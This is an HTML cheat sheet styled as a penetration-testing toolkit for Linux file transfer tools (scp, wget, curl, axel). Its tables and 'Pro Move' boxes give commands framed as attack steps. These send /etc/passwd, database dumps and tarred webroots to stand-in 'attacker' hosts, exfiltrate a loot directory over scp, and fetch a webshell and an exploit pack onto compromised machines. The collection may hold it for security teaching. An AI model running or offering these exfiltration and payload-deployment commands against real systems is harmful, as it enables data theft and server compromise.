<!DOCTYPE html>
<html>
<body>

<h1>📦 Upload & Download Files – Linux Command-Line Tools</h1>
<p><em>Your pentest toolkit for exfiltrating loot, uploading payloads, and downloading tools across networks.</em></p>

<h2 class="lock">🔐 SCP – Secure Copy (SSH Encrypted)</h2>
<p>Bulletproof file transfers over SSH. Every pentester's go-to for loot exfiltration.</p>

<h3>🎯 Core Commands</h3>
<table>
    <tr><th>Action</th><th>Command</th><th>Real-World Use</th></tr>
    <tr><td>Upload file</td><td><code>scp file.txt user@10.0.0.1:/tmp/</code></td><td>Send webshell to compromised server</td></tr>
    <tr><td>Upload dir</td><td><code>scp -r scripts/ kali@192.168.1.10:/var/www/</code></td><td>Deploy entire toolset</td></tr>
    <tr><td>Download file</td><td><code>scp kali@192.168.1.10:/etc/passwd .</code></td><td>Grab user enumeration</td></tr>
    <tr><td>Key auth</td><td><code>scp -i key.pem loot/ user@target:/tmp/</code></td><td>AWS/EC2 instance access</td></tr>
    <tr><td>Custom port</td><td><code>scp -P 2222 file.txt user@target:/tmp/</code></td><td>Non-standard SSH port</td></tr>
</table>

<div class="example"><strong>💥 Pentest Gold:</strong> <code>scp -i ~/.ssh/id_rsa -r /tmp/loot/ kali@attacker:~/exfil/</code> - Exfil entire loot directory over your key.</div>

<h2 class="globe">🌐 WGET – HTTP/FTP Downloader</h2>
<p>Download tools, payloads, wordlists when on restricted networks. No SSH required.</p>

<h3>🎯 Essential Patterns</h3>
<table>
    <tr><th>Action</th><th>Command</th><th>Scenario</th></tr>
    <tr><td>Single file</td><td><code>wget https://example.com/nc.exe</code></td><td>Grab netcat binary</td></tr>
    <tr><td>Wordlist</td><td><code>wget -O rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></td><td>Password cracking prep</td></tr>
    <tr><td>Directory</td><td><code>wget -r -np -nH --cut-dirs=1 http://target.com/admin/</code></td><td>Site mirror for recon</td></tr>
    <tr><td>Background</td><td><code>wget -b https://hugefile.zip</code></td><td>Download while working</td></tr>
</table>

<div class="scenario"><em>🔥 Pro Move: <code>wget --post-file=looted_db.sql http://attacker:8000/exfil</code> - Simulate upload when direct SCP blocked by firewall.</em></div>

<h2 class="loop">🔁 CURL – The Swiss Army Knife</h2>
<p>Upload, download, POST data. Handles everything wget can't dream of.</p>

<h3>🚀 Download Mastery</h3>
<table>
    <tr><th>Action</th><th>Command</th><th>Use Case</th></tr>
    <tr><td>Save with name</td><td><code>curl -o webshell.php http://attacker/webshell.php</code></td><td>Deploy payload</td></tr>
    <tr><td>Resume download</td><td><code>curl -C - -O http://bigfile.iso</code></td><td>Interrupted transfer</td></tr>
    <tr><td>Directory listing</td><td><code>curl -O http://target.com/backups/backup-[0-9]*.tar.gz</code></td><td>Grab all backups</td></tr>
</table>

<h3>📤 Upload Weapons</h3>
<table>
    <tr><th>Action</th><th>Command</th><th>Scenario</th></tr>
    <tr><td>Form upload</td><td><code>curl -F "file=@/etc/passwd" http://attacker/exfil</code></td><td>Quick loot dump</td></tr>
    <tr><td>Raw POST</td><td><code>curl -X POST -d @loot.txt http://attacker:8000/</code></td><td>Stealthy exfil</td></tr>
    <tr><td>Dir as tar</td><td><code>tar czf - /var/www/ | curl -X POST --data-binary @- http://attacker/</code></td><td>Entire webroot</td></tr>
</table>

<h2 class="rocket">🚀 AXEL – Speed Demon Downloader</h2>
<p>Multi-connection downloads. Perfect for slow target networks or huge ISOs.</p>

<h3>⚡ Turbo Commands</h3>
<table>
    <tr><th>Action</th><th>Command</th><th>Benefit</th></tr>
    <tr><td>10x speed</td><td><code>axel -n 10 kali.iso</code></td><td>10 parallel connections</td></tr>
    <tr><td>Specific path</td><td><code>axel -n 8 -o /tmp/ http://hugefile.iso</code></td><td>Custom save location</td></tr>
    <tr><td>Search+download</td><td><code>axel -n 16 $(curl -s pastebin.com/raw/abc | grep http)</code></td><td>Batch download links</td></tr>
</table>

<div class="example"><strong>💨 Field Tested:</strong> <code>axel -n 16 -o /dev/shm/ http://attacker.tools/windows-exploit-pack.zip</code> - Downloads 2GB toolkit in minutes on slow hotel WiFi.</div>

<h2>⚔️ Battle Matrix</h2>
<table>
    <tr><th>Scenario</th><th>SCP</th><th>Wget</th><th>Curl</th><th>Axel</th></tr>
    <tr><td>Exfil loot</td><td>✅ Fastest</td><td>❌ No</td><td>✅ Flexible</td><td>❌ No</td></tr>
    <tr><td>Download tools</td><td>✅ Secure</td><td>✅ Simple</td><td>✅ Advanced</td><td>✅ Fastest</td></tr>
    <tr><td>Upload payload</td><td>✅ SSH</td><td>⚠️ Hacky</td><td>✅ Perfect</td><td>❌ No</td></tr>
    <tr><td>Site mirror</td><td>❌ No</td><td>✅ Directory</td><td>✅ Selective</td><td>❌ No</td></tr>
</table>

</body>
</html>
